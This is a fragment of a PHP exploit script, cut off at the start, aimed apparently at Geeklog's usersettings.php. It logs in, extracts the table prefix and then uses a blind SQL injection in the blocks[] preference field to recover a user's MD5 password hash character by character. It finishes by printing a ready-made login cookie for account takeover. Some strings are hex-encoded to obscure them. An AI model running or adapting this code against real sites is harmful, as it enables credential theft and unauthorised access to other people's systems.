tmp); $i++) {
           $tmp_i = explode(";", $tmp[$i]);
           $cookies .= $tmp_i[0]."; ";
       }
       if (stripos ($cookies, "\x70\x61\x73\x73\x77\x6f\x72\x64")) {
           return $cookies;
       } else {
           die("[*] Unable to login!");
       }

   }

   function xtrct_prefix() {
       global $host, $port, $path, $cookies, $url;
       $out = _s($url, $cookies, 0, "");
       $tmp = explode("\x62\x6c\x6f\x63\x6b\x73\x5b\x5d", $out);
       if (count($tmp) < 2) {
           die("[!] Not logged in!");
       }
       $tmp = explode("\x22", $tmp[0]);
       $prefix = $tmp[count($tmp)-1];
       return $prefix;
   }

   function is_checked() {
       global $host, $port, $path, $cookies, $url;
       $out = _s($url, $cookies, 0, "");
       $tmp = explode("\x62\x6c\x6f\x63\x6b\x73\x5b\x5d", $out);
       $tmp = explode("\x3e", $tmp[1]);
       $s = $tmp[0];
       if (stripos ($s, "\x22\x63\x68\x65\x63\x6b\x65\x64\x22")) {
           return 1;
       } else {
           return 0;
       }
   }

   if (!$_use_ck) {
       $cookies = login();
   }

   $url = "http://$host:$port".$path."usersettings.php";
   $prefix = xtrct_prefix();
   print "[*] prefix->'".$prefix."'\n";

   if (!$_skiptest) {
       run_test();
   }
   if ($_test) {
       die;
   }

   #uncheck all boxes
   $rst_sql = "0) AND 0 UNION SELECT 1,0x61646d696e5f626c6f636b FROM ".$prefix."users WHERE
".$where." LIMIT 1/*";
   $out = _s($url, $cookies, 1, "mode=savepreferences&".$prefix."blocks[0]=".urlencode($rst_sql)."&");
   #then start extraction
   $c = array();
   $c = array_merge($c, range(0x30, 0x39));
   $c = array_merge($c, range(0x61, 0x66));
   $url = "http://$host:$port".$path;
   $_hash = "";
   print ("[*] Initiating hash extraction ...\n");
   for ($j = 1; $j < 0x21; $j++) {
       for ($i = 0; $i <= 0xff; $i++) {
           $f = false;
           if (in_array($i, $c)) {
               $sql = "0) AND 0 UNION SELECT 1,IF(ASCII(SUBSTR(passwd FROM $j FOR
1))=$i,1,0x61646d696e5f626c6f636b) FROM ".$prefix."users WHERE ".$where." LIMIT 1/*";
               $url = "http://$host:$port".$path."usersettings.php";
               $out = _s($url, $cookies, 1,
"mode=savepreferences&".$prefix."blocks[0]=".urlencode($sql)."&");
               if (is_checked()) {
                   $f = true;
                   $_hash .= chr($i);
                   print "[*] Md5 Hash: ".$_hash.str_repeat("?", 0x20-$j)."\n";
                   #if found , uncheck again
                   $out = _s($url, $cookies, 1,
"mode=savepreferences&".$prefix."blocks[0]=".urlencode($rst_sql)."&");
                   break;
               }
           }
       }
       if ($f == false) {
           die("\n[!] Unknown error ...");
       }
   }
   print "[*] Done! Cookie: geeklog=$uid; password=".$_hash.";\n";
?>
